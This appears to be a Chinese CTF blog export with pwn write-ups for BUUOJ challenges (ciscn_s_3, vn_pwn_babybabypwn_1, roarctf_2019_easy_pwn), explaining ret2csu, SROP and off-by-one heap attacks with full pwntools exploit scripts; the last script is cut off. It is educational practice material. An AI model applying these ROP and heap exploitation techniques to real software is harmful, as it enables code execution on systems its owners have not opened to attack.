<li>分析文件，程序调用了sys_read，读取0x400字节，以及sys_write，输出0x30字节</li>
<li>有明显的栈溢出</li>
<li>程序中给出gadget，分别是<code>mov  rax, 0Fh ; retn</code> 和 <code>mov  rax, 3Bh ; retn</code>。对应到函数，就是<code>sys_rt_sigreturn</code>和<code>sys_exec</code></li>
</ul>
<h3 id="解法一-—-使用CSU构建ROP链">解法一 — 使用CSU构建ROP链</h3>
<h4 id="分析-4">分析</h4>
<ul>
<li>
<p>vuln函数中sys_write会泄露出栈地址，所以我们可以通过计算偏移，获得输入数据的起始栈地址</p>
</li>
<li>
<p>我们可以尝试ret2syscall，执行<code>sys_exec('/bin/sh', 0, 0)</code>来获取shell，但有几个前提</p>
<blockquote>
<p>%rax = 0x3b, %rdi = binsh_addr, %rsi = 0, %rdx = 0</p>
</blockquote>
</li>
<li>
<p>但是经过一番查找，发现没有%rdx对应的gadget, 所以常规构建ROP链的解法不可用<br>
不过我们可以利用<code>__libc_csu_init</code>里的gadget来完成我们的目的</p>
<ul>
<li>
<p>__libc_csu_init 可用gadgets源码</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">loc_400580:</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">r15d</span></span><br><span class="line"><span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r12</span>+<span class="built_in">rbx</span>*<span class="number">8</span>]</span><br><span class="line"><span class="keyword">add</span>     <span class="built_in">rbx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">jnz</span>     short loc_400580</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_400596:</span></span><br><span class="line"><span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">r12</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">r13</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">r14</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">r15</span></span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>我们可以通过 <code>__libc_csu_init</code> 下的一堆的pop指令，将对应寄存器赋值，然后ret到上面的<code>loc_400580</code><br>
通过其中对%rdi、%rsi、%edx的赋值来实现对函数参数的控制，并通过<code>call    qword ptr [r12+rbx*8]</code>来执行目标代码<br>
除了这个，我们必须在输入数据里构造这样的一个类init_array的数组，并让%r12指向它，从而执行我们的目标代码</p>
</li>
</ul>
<h4 id="EXP-4">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line"><span class="comment"># io = remote("node3.buuoj.cn", 25033)</span></span><br><span class="line">e = ELF(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">rax_sys_exec_addr = <span class="number">0x00000000004004e2</span></span><br><span class="line">pop_r12_r13_r14_r15 = <span class="number">0x000000000040059C</span></span><br><span class="line">call_gadget_addr = <span class="number">0x0000000000400580</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000400501</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x00000000004005a3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = flat(cyclic(<span class="number">0x10</span>), e.symbols[<span class="string">'vuln'</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">msg = io.recv()</span><br><span class="line">stack_addr = u64(msg[<span class="number">32</span>:<span class="number">-8</span>]) - (<span class="number">0x128</span> - <span class="number">0x010</span>)</span><br><span class="line">log.success(<span class="string">"str addr: "</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'/bin/sh\x00'</span>, cyclic(<span class="number">0x8</span>),</span><br><span class="line">    pop_r12_r13_r14_r15, stack_addr + <span class="number">64</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, call_gadget_addr, <span class="comment"># ROP chain</span></span><br><span class="line">    rax_sys_exec_addr, pop_rdi_addr, stack_addr, syscall_addr)      <span class="comment"># init_array alike</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="解法二-—-SROP-Attack">解法二 — SROP Attack</h3>
<h4 id="分析-5">分析</h4>
<ul>
<li>和解法一有点不同，我们可以通过SROP来sys_exec(’/bin/sh’, 0, 0)</li>
<li>不过在此之前，还是需要先泄露栈地址出来。</li>
</ul>
<h4 id="EXP-5">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27047</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF("buu_libcs/ubuntu19-64-libc-2.29.so")</span></span><br><span class="line">e = ELF(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">rax_sys_rt_sigreturn_addr = <span class="number">0x00000000004004da</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="number">0x10</span>), e.symbols[<span class="string">'vuln'</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">msg = io.recv()</span><br><span class="line">stack_addr = u64(msg[<span class="number">32</span>:<span class="number">-8</span>]) - (<span class="number">0x128</span> - <span class="number">0x010</span>)</span><br><span class="line">log.success(<span class="string">"stack addr: "</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x30</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = flat(<span class="string">"/bin/sh\x00"</span>*<span class="number">2</span>, rax_sys_rt_sigreturn_addr, syscall_addr, frame)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="参考">参考</h4>
<ul>
<li>
<blockquote>
<p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p>
</blockquote>
</li>
<li>
<blockquote>
<p><a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">CTF wiki SROP</a></p>
</blockquote>
</li>
</ul>
<h3 id="随笔">随笔</h3>
<ul>
<li>对于这两种不同解题方式的对比，我们不难看出，SROP所使用的gadget比常规ROP更少，但同时也更难找到。</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2020/05/SROP/</url>
    <content><![CDATA[<h2 id="1-介绍">1. 介绍</h2>
<blockquote>
<p>前面虽然做过一道关于SROP的题，但并没有具体总结。这次就来总结一下</p>
</blockquote>
<ul>
<li>
<p><strong>SROP的原理</strong>? (下文摘自CTF wiki)</p>
<ul>
<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址。我们称ucontext以及siginfo这一段为Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
<li>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</li>
</ul>
</li>
<li>
<p>Signal Frame的构建是比较复杂的，因为不同架构下的结构是不一样的。不过值得一提的是，在目前的<code>pwntools</code>中已经集成了对于SROP的攻击。所以我们可以很方便的构建出Signal Frame。</p>
</li>
</ul>
<blockquote>
<p>注： 在本文中，Signal Frame和SigreturnFrame是同一个意思</p>
</blockquote>
<a id="more"></a>
<ul>
<li><strong>注意点:</strong>
<ol>
<li>构建SigreturnFrame时，<strong>必须设置rsp和rip</strong>，否则就直接<code>SIGSEV</code></li>
<li>构建SigreturnFrame时，必须确保 <strong>syscall</strong> SYS_sigreturn时，其rsp指向sigreturnFrame的首地址</li>
<li>如果输入SigreturnFrame后，程序 <strong>call</strong> SYS_sigreturn,则传入的SigreturnFrame <strong>最好从第八个字节开始传入</strong> (<code>str(frame)[8:]</code>)，而不是目的寄存器向前偏移一个位置（不是很懂？请阅读下面的例题 :-)）</li>
</ol>
</li>
</ul>
<h2 id="2-例子-——-vn-pwn-babybabypwn-1">2. 例子 —— vn_pwn_babybabypwn_1</h2>
<h3 id="分析">分析</h3>
<ul>
<li>ELF文件保护全开， 但题目给出了libc</li>
<li>程序使用了<code>seccomp</code>函数，只能ORW</li>
<li>输入数据后程序会call sys_sigreturn(注意是<code>call</code>)<br>
<img src="/2020/05/SROP/code.png" alt="img"></li>
<li>我们可以构建SigreturnFrame，将栈迁移到libc的bss段，然后一路ROP从而get flag.</li>
</ul>
<h3 id="坑点">坑点</h3>
<ul>
<li>
<p>由于程序是 <strong>call</strong> sys_sigreturn ，所以当即将执行sys_sigreturn时，其rsp指向的是 <code>&amp;SigreturnFrame + 8</code>(call指令会将old rip压栈)。 所以在传入SigreturnFrame时，必须从第8个字节开始，否则会SIGSEV，即</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = new_stack</span><br><span class="line">frame.rdx = <span class="number">0x180</span></span><br><span class="line">frame.rsp = new_stack </span><br><span class="line">frame.rip = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span></span><br><span class="line"><span class="comment"># 注意下一行</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame)[<span class="number">8</span>:])</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>偏移8个字节可能大家都知道，但可能有部分小伙伴是这么做的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''' 注：以下64位SigreturnFrame结构，来自pwntools库中的SROP.py</span></span><br><span class="line"><span class="string"># Reference : https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf</span></span><br><span class="line"><span class="string">'amd64': &#123;0: 'uc_flags', 8: '&amp;uc', 16: 'uc_stack.ss_sp', 24: 'uc_stack.ss_flags',</span></span><br><span class="line"><span class="string">          32: 'uc_stack.ss_size', 40: 'r8', 48: 'r9', 56: 'r10', 64: 'r11', 72: 'r12',</span></span><br><span class="line"><span class="string">          80: 'r13', 88: 'r14', 96: 'r15', 104: 'rdi', 112: 'rsi', 120: 'rbp', 128: 'rbx',</span></span><br><span class="line"><span class="string">          136: 'rdx', 144: 'rax', 152: 'rcx', 160: 'rsp', 168: 'rip', 176: 'eflags',</span></span><br><span class="line"><span class="string">          184: 'csgsfs', 192: 'err', 200: 'trapno', 208: 'oldmask', 216: 'cr2',</span></span><br><span class="line"><span class="string">          224: '&amp;fpstate', 232: '__reserved', 240: 'sigmask'&#125;,</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdx = constants.SYS_read            <span class="comment"># rax</span></span><br><span class="line">frame.r15 = <span class="number">0</span>                             <span class="comment"># rdi</span></span><br><span class="line">frame.rdi = new_stack                     <span class="comment"># rsi</span></span><br><span class="line">frame.rbx = <span class="number">0x180</span>                         <span class="comment"># rdx</span></span><br><span class="line">frame.rcx = new_stack                     <span class="comment"># rsp</span></span><br><span class="line">frame.rsp = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span>  <span class="comment"># rip</span></span><br><span class="line"><span class="comment"># 注意下一行</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame))</span><br></pre></td></tr></table></figure>
<p>他们将每个寄存器的值都向上偏移8个字节，从而使rax、rdi等寄存器中刚好存入我们期望的值<br>
但动态调试时，执行函数（例如read）,或者syscall，总会引发SIGSEV，这是为什么？</p>
<ul>
<li>原因是因为SigreturnFrame中的某个至关重要的寄存器值 —— cs/gs/fs —— 没有一起偏移过去</li>
<li>只要再设置一条<code>frame.eflags = 51  # cs</code>，程序就可以正常工作了</li>
<li>但即便如此，这种方法仍然比第一种方法麻烦，不推荐使用</li>
</ul>
</li>
</ul>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./vn_pwn_babybabypwn_1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./buu_libcs/ubuntu16-64-libc-2.23.so"</span>)</span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line">ru = <span class="keyword">lambda</span> msg : io.recvuntil(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Here is my gift: "</span>)</span><br><span class="line">msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">libc_puts = int(msg, <span class="number">16</span>)</span><br><span class="line">libc.address = libc_puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">new_stack = libc.bss(<span class="number">0x60</span>)</span><br><span class="line">log.success(<span class="string">"libc base addr: "</span> + hex(libc.address))</span><br><span class="line">log.success(<span class="string">"new_stack addr: "</span> + hex(new_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = new_stack</span><br><span class="line">frame.rdx = <span class="number">0x180</span></span><br><span class="line">frame.rsp = new_stack </span><br><span class="line">frame.rip = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame)[<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二（不推荐</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">frame = SigreturnFrame()</span></span><br><span class="line"><span class="string">frame.rdx = constants.SYS_read            # rax</span></span><br><span class="line"><span class="string">frame.r15 = 0                             # rdi</span></span><br><span class="line"><span class="string">frame.rdi = new_stack                     # rsi</span></span><br><span class="line"><span class="string">frame.rbx = 0x180                         # rdx</span></span><br><span class="line"><span class="string">frame.rcx = new_stack                     # rsp</span></span><br><span class="line"><span class="string">frame.rsp = libc.symbols['syscall'] + 23  # rip</span></span><br><span class="line"><span class="string">frame.eflags = 51                       # cs/gs/fs</span></span><br><span class="line"><span class="string"># 注意下一行</span></span><br><span class="line"><span class="string">#debug("b syscall\nc")</span></span><br><span class="line"><span class="string">sla("Please input magic message: ", flat(frame))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">rop = ROP(libc, base=new_stack)</span><br><span class="line">rop.open(<span class="string">'flag\x00'</span>, <span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>, libc.bss(), <span class="number">0x60</span>)</span><br><span class="line">rop.write(<span class="number">1</span>, libc.bss(), <span class="number">0x60</span>)</span><br><span class="line">log.info(rop.dump())</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug("b syscall\nc")</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 13 - off_by_one &amp;&amp; __realloc_hook</title>
    <url>/2020/05/heap-13-off-by-one-and-realloc-hook/</url>
    <content><![CDATA[<h2 id="1-off-by-one-介绍">1. off-by-one 介绍</h2>
<ul>
<li>
<p>off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且 <strong>只越界了一个字节</strong></p>
</li>
<li>
<p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关<br>
例如以下代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* note = <span class="built_in">malloc</span>(noteSize);</span><br><span class="line"><span class="keyword">char</span>* input = <span class="built_in">malloc</span>(noteSize + <span class="number">1</span>);</span><br><span class="line">fgets(<span class="built_in">stdin</span>, input, noteSize);</span><br><span class="line"><span class="comment">// 注意下面两条代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(input) &lt;= noteSize&gt;) <span class="comment">// strlen计算字符串长度时不会加上'\0'</span></span><br><span class="line">  <span class="built_in">strcpy</span>(note, input);        <span class="comment">// 而strcpy会把'\0'一起复制过去，如此便多写入了一个字节（'\0'）</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>glibc中的内存管理机制ptmalloc <strong>极度依赖</strong> chunk的size成员，故off-by-one漏洞威力强大</p>
</li>
<li>
<p>同时， 由于Linux 的堆管理机制 ptmalloc 验证的松散性， off-by-one 漏洞的利用难度不大</p>
</li>
</ul>
<a id="more"></a>
<h2 id="2-realloc-hook的利用方式">2. __realloc_hook的利用方式</h2>
<ul>
<li>
<p>在说起__realloc_hook前，我们先看看__libc_realloc函数的汇编代码<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/realloc.png" alt="img"></p>
</li>
<li>
<p>我们可以很容易的看到，realloc函数在一开始就会大量的抬高栈帧，然后执行<code>__realloc_hook指向的函数</code>（如果有的话）</p>
</li>
<li>
<p>这种抬高栈帧的手法，我们可以用在 <code>千辛万苦打穿__malloc_hook后，one_gadget不满足利用条件的尴尬场景</code></p>
</li>
<li>
<p>__malloc_hook和__realloc_hook在内存上是相邻的，所以fastbin attack修改这两个指针是比较方便的<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/realloc_hook_place.png" alt="img"></p>
</li>
<li>
<p>我们可以将__malloc_hook修改为 realloc函数上偏移数个字节后的地址（偏移字节取决于栈帧抬高的大小）。例如上图所示，若希望栈帧抬高0x38则设置__malloc_hook为 &amp;realloc+16</p>
<blockquote>
<p>注意，此处所指的realloc函数为<code>__libc_realloc</code>，而不是<code>_int_realloc</code></p>
</blockquote>
</li>
<li>
<p>当抬高栈帧后，满足了one_gadget的执行条件，自然就要设置执行one_gadget，所以其__realloc_hook就需要设置为one_gadget地址</p>
<blockquote>
<p>即：__malloc_hook设置为realloc地址+offset, __realloc_hook设置为one_gadget地址</p>
</blockquote>
</li>
</ul>
<h2 id="3-例题——roarctf-2019-easy-pwn">3. 例题——roarctf_2019_easy_pwn</h2>
<h3 id="易知信息">易知信息</h3>
<ul>
<li>使用libc 2.23， 没有tcache :-)</li>
<li>可以add, drop, write, print</li>
<li>一个很明显白给的off-by-one<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/exploit.png" alt="img"></li>
</ul>
<h3 id="分析">分析</h3>
<blockquote>
<p>这题做法其实和上一道fastbin attack相差不大，只是有一点点不太一样</p>
</blockquote>
<ul>
<li>首先malloc 4个chunk, chunk size 分别为
<ul>
<li>0x20</li>
<li>0x20</li>
<li>0x90 (unsorted chunk的最小size)</li>
<li>0x20 (防止unsorted chunk释放时被top chunk合并)<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/allocate4chunks.png" alt="img"></li>
</ul>
</li>
<li>然后通过off-by-one漏洞，修改chunk1的size <strong>(chunk序号从0排列)</strong><br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/modifyFastchunksize.png" alt="img"></li>
<li>将chunk1释放再重新malloc回来，这样就提高了chunk1的可写范围</li>
<li>之后需要修补一下chunk2的size，为下一步free泄露main_arena地址做准备<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/improveUnsortedChunksize.png" alt="img"></li>
<li>free掉chunk2, 从而泄露main_arena地址。libc基地址到手，可以算one_gadget、__malloc_hook地址等<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/arenaAddr.png" alt="img"></li>
<li>之后就要准备fastbin attack打__malloc_hook上<br>
先把刚刚free掉的chunk2 malloc回来，然后分别修改chunk2、chunk3的size为0x71、0x21。<br>
修改chunk2的size是因为要把chunk2伪造为一个fast chunk，而修改chunk3的size是为了躲过free的检测<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/fakeFastchunk.png" alt="img"></li>
<li>free掉chunk2，从而将chunk2接到了fast bin上。</li>
<li>然后就是愉快的fastbin attack了。这里就不再赘述。</li>
</ul>
<blockquote>
<p>不了解fastbin attack? 看看<a href="/2020/05/heap-12-fastbin_attack/">这个</a></p>
</blockquote>
<ul>
<li>查看一下可用的one_gadget<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/one_gadget.png" alt="img"><br>
第一个one_gadget经过动态调试，发现其条件始终无法被满足<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/one_gadget_raxIsNotZero.png" alt="img"><br>
而通过动态调试，执行one_gadget时，发现栈上的数据并不理想<br>
<img src="/2020/05/heap-13-off-by-one-and-realloc-hook/one_gadget_stackIsNotGood.png" alt="img"></li>
<li>所以我们需要用__malloc_hook打realloc函数来抬高栈帧，然后用__realloc_hook跳one_gadget来get shell。</li>
</ul>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./roarctf_2019_easy_pwn"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF("./libc.so.6")</span></span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index, offset)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    io.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    io.recv(offset)</span><br><span class="line">    data = io.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x18</span> + <span class="number">10</span>, cyclic(<span class="number">0x18</span>) + p8(<span class="number">0xB1</span>))</span><br><span class="line"></span><br><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xA0</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>, <span class="number">0x20</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x91</span>))</span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">msg = show(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">in_arena_addr = u64(msg)</span><br><span class="line">libcbase = in_arena_addr - (<span class="number">0x7fc485d20b78</span> - <span class="number">0x7fc48595c000</span>)</span><br><span class="line">fake_chunk_addr = in_arena_addr - (<span class="number">0x7fc485d20b78</span> - <span class="number">0x7fc485d20aed</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"in_arena_addr: "</span> + hex(in_arena_addr))</span><br><span class="line">log.info(<span class="string">"libcbase: "</span> + hex(libcbase))</span><br><span class="line">log.info(<span class="string">"fake_chunk_addr: "</span> + hex(fake_chunk_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">write(<span class="number">1</span>, <span class="number">0x90</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>, cyclic(<span class="number">0x60</span>), <span class="number">0</span>, <span class="number">0x21</span>))</span><br><span class="line">debug()</span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>, <span class="number">0x28</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>, fake_chunk_addr))</span><br><span class="line"></span><br><span class="line">add(<span 